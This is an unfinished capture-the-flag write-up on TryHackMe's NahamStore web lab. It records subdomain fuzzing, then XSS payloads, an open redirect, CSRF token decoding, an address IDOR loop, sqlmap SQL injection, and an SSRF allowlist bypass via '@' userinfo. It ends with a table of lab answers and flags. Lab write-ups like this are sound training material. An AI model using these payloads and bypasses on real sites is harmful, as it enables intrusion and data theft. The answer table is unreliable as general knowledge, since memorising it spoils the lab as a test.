# TryHackMe — NahamStore (in progress)

> Full-scope web application pentest against a deliberately vulnerable e-commerce app. Ten vulnerability classes across four subdomains.

**Status:** 14 of ~22 answers. Remaining: LFI, SSRF ×2, XXE ×2, RCE ×2, second open redirect, order-3 IDOR, blind SQLi.

## Setup

The app is vhost-routed. Add the apex to hosts, then substitute `.com` for `.thm` on every subdomain you discover:

```bash
echo "<target-ip> nahamstore.thm" | sudo tee -a /etc/hosts
```

### Subdomain enumeration

The first sweep returned nothing, for a reason worth recording: the catch-all **echoes the requested hostname back in its 404 page**, so the response size shifts with the length of whatever you fuzz. A fixed `-fs` filter can never work.

```bash
curl -s -H "Host: nahamstore.com" http://<target-ip>/ | wc -c   # 916
curl -s -H "Host: nahamstore.thm" http://<target-ip>/ | wc -c   # 4254
curl -s -H "Host: www.nahamstore.com" http://<target-ip>/ | wc -c  # 920
```

Two findings there: the app routes on `.thm`, not `.com`, and the size varies by hostname length. Filter on **words** instead, which stays constant:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://<target-ip>/ -H "Host: FUZZ.nahamstore.thm" -fw 125 -t 50
```

| Subdomain | Response |
|---|---|
| `www` | 301 → apex |
| `shop` | 301 → apex |
| `marketing` | 200 — campaign signup pages |
| `stock` | 200 — JSON API |

A 3-million-entry list (`n0kovo_subdomains.txt`) found nothing further.

```bash
sudo tee -a /etc/hosts <<'EOF'
<target-ip> www.nahamstore.thm
<target-ip> shop.nahamstore.thm
<target-ip> marketing.nahamstore.thm
<target-ip> stock.nahamstore.thm
EOF
```

### Content discovery

```bash
gobuster dir -u http://nahamstore.thm \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 -q
```

```
/search     200    /uploads    301 → 127.0.0.1/uploads/
/login      200    /staff      200
/register   200    /basket     200
/logout     302    /robots.txt 200
/returns    200
```

Endpoints the HTML and inline JS gave up that no wordlist would:

| Endpoint | Source | Note |
|---|---|---|
| `/stockcheck` | product page JS | SSRF |
| `/search-products?q=` | search page JS | JSON API |
| `/pdf-generator` | order page form | server-side PDF renderer |
| `/product/picture/?file=` | product `img` tag | whitelist lookup, not LFI |

---

## XSS

### Product page — `<title>`

The `name` parameter is reflected into the document title:

```bash
curl -s "http://nahamstore.thm/product?id=1&name=soultest123" | grep -B5 'soultest123'
```

```html
<title>NahamStore - soultest123</title>
```

```
/product?id=1&name=</title><script>alert(1)</script>
```

**Tag to escape: `title`**

### Search page — JavaScript variable

```bash
curl -s "http://nahamstore.thm/search?q=soultest123" | grep -A4 'soultest123'
```

```javascript
var search = 'soultest123';
$.get('/search-products?q=' + search, function(resp){ ... });
```

**Variable to escape: `search`**

### Returns page — `<textarea>`

```html
<textarea name="return_info" class="form-control">
```

**Tag to escape: `textarea`**

### Hidden parameters

Rather than guessing names, fuzz for reflection with `-mr`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://nahamstore.thm/?FUZZ=soultest123" -mr "soultest123" -t 50 -s
```

Returns `q` and `r`. On the product page the same sweep returns `discount`, `id`, `name`.

**Shop home page: `q`** · **Other hidden parameter: `discount`**

`discount` reflects inside an attribute, so it needs attribute escaping:

```html
<input placeholder="Discount Code" name="discount" value="soultest123">
```

```
discount="><script>alert(1)</script>
```

### Stored XSS — HTTP header

The order detail page renders the `User-Agent` of the request that placed the order:

```
Order Date: 01/11/2026 14:55:26
User Agent: curl/8.22.0
```

**Header: `User-Agent`**

### URL-reflection XSS

The 404 page echoes the requested path unencoded:

```bash
curl -s "http://nahamstore.thm/soultest123%3Cscript%3Ealert(1)%3C/script%3E" | grep -o 'soultest123.*'
```

```html
<h1 class="text-center">Page Not Found</h1>
<p class="text-center">Sorry, we couldn't find soultest123<script>alert(1)</script> anywhere</p>
```

**H1 value: `Page Not Found`**

---

## Open Redirect

```bash
for p in url redirect next return to r dest destination continue redir out link; do
  printf "%-12s " "$p"
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://nahamstore.thm/?$p=https://example.com"
done
```

```
r    302    https://example.com/
```

**Open Redirect One: `r`**

The second was not found by sweeping `burp-parameter-names.txt` against the apex, `/login`, `/register`, `/basket`, `/returns`, `/product`, `/search`, `/logout`, or the subdomains, and no page contains a `window.location` or meta-refresh.

---

## CSRF

Three settings forms, three different postures:

```bash
for p in email password disable; do
  echo "=== /account/settings/$p ==="
  curl -s -b cookies.txt "http://nahamstore.thm/account/settings/$p" | grep -oiE '<form[^>]*>|<input[^>]*>'
done
```

| Form | Protection |
|---|---|
| `/account/settings/email` | `csrf_protect` — base64 JSON with an MD5 signature |
| `/account/settings/password` | **none** |
| `/account/settings/disable` | `csrf_disable_protect` — base64 of the bare user ID |

Decoding the tokens:

```bash
echo "eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4Tnprek5UUTBOVGd6SW4wPSIsInNpZ25hdHVyZSI6ImUzM2IxMTRmZDBhNmE4MjFmM2M3MGM1NzRjODY2NjA0In0=" | base64 -d
# {"data":"eyJ1c2VyX2lkIjo0...","signature":"e33b114fd0a6a821f3c70c574c866604"}

echo "eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNzkzNTQ0NTgzIn0=" | base64 -d
# {"user_id":4,"timestamp":"1793544583"}

echo "NA==" | base64 -d
# 4
```

The disable form's entire protection is the user ID in base64 — no signature, trivially forgeable.

| Answer | Value |
|---|---|
| URL with no CSRF protection | `http://nahamstore.thm/account/settings/password` |
| Field to remove | `csrf_protect` |
| Encoding used | `base64` |

---

## IDOR — Address Book

The address book itself exposes only `delete_address_id`. The real IDOR is on **checkout**, where the basket renders a chosen address by ID:

```html
<form method="post">
  <input type="hidden" name="address_id" value="5">
  <input type="submit" value="Mr Soul Test">
</form>
```

Nothing checks ownership. Walk the IDs, re-adding to the basket each time since checkout drains it:

```bash
for i in 1 2 3 4; do
  curl -s -b cookies.txt -X POST "http://nahamstore.thm/product?id=1" -d "add_to_basket=1" -o /dev/null
  echo "=== address_id=$i ==="
  curl -s -b cookies.txt -X POST http://nahamstore.thm/basket -d "address_id=$i" \
    | grep -oiE '<strong>[^<]*</strong>|New York|[0-9]+ [A-Za-z ]+<br>' | head -6
done
```

| ID | Owner | Address |
|---|---|---|
| 1 | Mrs Rita Miles | 3914 Charles Street |
| 2 | Mr Jimmy Jones | 3999 Clay Lick Road |
| 3 | **Mr Jimmy Jones** | **160 Broadway**, New York |
| 4 | Mr Charles Cook | 4754 Swick Hill Street |

**First line of the New York address: `160 Broadway`**

---

## SQL Injection

```bash
sqlmap -u "http://nahamstore.thm/product?id=1" --batch --random-agent --level=2 --risk=2 --dbs
```

Five techniques confirmed — boolean blind, error-based (GTID_SUBSET), stacked queries, time-based blind, and UNION with 5 columns. Backend MySQL ≥ 5.6.

```bash
sqlmap -u "http://nahamstore.thm/product?id=1" --batch --random-agent \
  -D nahamstore -T sqli_one -C flag --dump
```

**Flag 1: `{d890234e20be48ff96a2f9caab0de55c}`**

The `nahamstore` database contains only `product` and `sqli_one`, so `sql_two` lives in a database this injection point can't see.

---

## SSRF — partial

The product page's Check Stock button posts to `/stockcheck`:

```javascript
$.post('/stockcheck', {
    product_id : $(this).attr('data-product-id'),
    server     : 'stock.nahamstore.thm'
});
```

`server` is validated, but only by substring — so userinfo syntax defeats it, since everything after `@` is the real host:

```bash
curl -s -X POST http://nahamstore.thm/stockcheck \
  --data-urlencode "server=stock.nahamstore.thm@127.0.0.1" -d "product_id=1"
```

That returns the main app's 404 page, confirming full-read SSRF to arbitrary hosts. Path injection works too, truncating the appended `/product/{id}` with a query separator:

```bash
curl -s -X POST http://nahamstore.thm/stockcheck \
  --data-urlencode "server=stock.nahamstore.thm/user?" -d "product_id=1"
```

It also reaches external hosts, which makes it a usable connectivity probe:

```bash
curl -s -X POST http://nahamstore.thm/stockcheck \
  --data-urlencode "server=stock.nahamstore.thm@<your-vpn-ip>:8000" -d "product_id=1"
```

What it hasn't reached yet is an API holding user data. The public `stock` vhost exposes only `/product`, a port sweep through the SSRF found nothing but 80, and no fifth vhost exists.

---

## Dead Ends (documented so they aren't retried)

| Lead | Why it failed |
|---|---|
| `/product/picture/?file=` | Looks like LFI but is a whitelist lookup — `./file.jpg` and `images/../file.jpg` both fail while the bare name works |
| `C:\ProgramData`-style staging on `/uploads` | Files are renamed on upload and the directory 403s |
| `/staff` xlsx upload as XXE | Accepts the file (needs `Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`) but never parses it — no entity resolution, no remote DTD fetch |
| `/pdf-generator` HTML injection | Renders the shipping address, but strips `<`, `>`, `/`, `:` — `<iframe src="file:///lfi/flag.txt">` arrives as `iframe src=filelfiflagtxt` |
| `/pdf-generator` IDOR | Ownership-checked: *"Order does not belong to this user_id"* |
| `sqlmap --file-read` / `--os-shell` | DB user has no FILE privilege and no write access to the webroot |
| `/search-products?q=` SQLi | Not injectable at `--level=5 --risk=3` |
| Param fuzz for LFI | `burp-parameter-names.txt` against every endpoint and subdomain, matching on `root:x:` — no hits |

---

## Answers so far

| Question | Answer |
|---|---|
| Subdomains | `www`, `shop`, `marketing`, `stock` |
| XSS — product page tag | `title` |
| XSS — JavaScript variable | `search` |
| XSS — returns page tag | `textarea` |
| XSS — hidden param (home) | `q` |
| XSS — other hidden param | `discount` |
| XSS — stored via HTTP header | `User-Agent` |
| XSS — H1 of URL-reflection page | `Page Not Found` |
| Open Redirect One | `r` |
| CSRF — unprotected URL | `http://nahamstore.thm/account/settings/password` |
| CSRF — field to remove | `csrf_protect` |
| CSRF — encoding | `base64` |
| IDOR — New York address | `160 Broadway` |
| SQLi — flag 1 | `{d890234e20be48ff96a2f9caab0de55c}` |

---

## Notes

**Filter on the stable column.** The subdomain sweep failed against a 110k wordlist because the 404 page echoed the hostname, making size useless as a filter. Words and lines were constant. Always measure which column actually holds still before filtering on it.

**Read the JavaScript.** Three of the most important endpoints — `/stockcheck`, `/search-products`, `/pdf-generator` — appear in inline script or a form action and in no wordlist. Directory brute-forcing found `/staff` and `/uploads`; parsing the HTML found everything that mattered.

**`$path` is a tied array in zsh.** A loop written as `for path in ...` silently destroys `PATH`, and the shell starts reporting `command not found` for `curl` and `grep` several commands later. Use any other variable name.

**Substring allowlists aren't allowlists.** `server` had to contain `stock.nahamstore.thm`, and `stock.nahamstore.thm@127.0.0.1` satisfies that while pointing somewhere else entirely — the same class of bug as a prefix-matched path allowlist.

---

**Platform:** TryHackMe — [S0uls](https://tryhackme.com/p/S0uls)
**Lab:** Authorized training environment only.
